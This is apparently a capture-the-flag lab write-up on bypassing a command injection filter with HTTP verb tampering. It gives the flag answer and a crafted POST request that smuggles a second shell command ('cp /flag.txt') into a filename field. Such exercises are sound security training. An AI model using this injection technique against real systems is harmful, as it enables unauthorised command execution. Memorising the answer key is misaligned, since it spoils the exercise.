# Bypassing Security Filters
## Questions
1. To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./ **Answer: HTB{b3_v3rb_c0n51573n7}**
   - Send this request to bypass the security filter and exploit the command injection vulnerability:
        ```
        POST /index.php HTTP/1.1
        Host: 154.57.164.72:30612
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 29

        filename=test;+cp+/flag.txt+.
        ```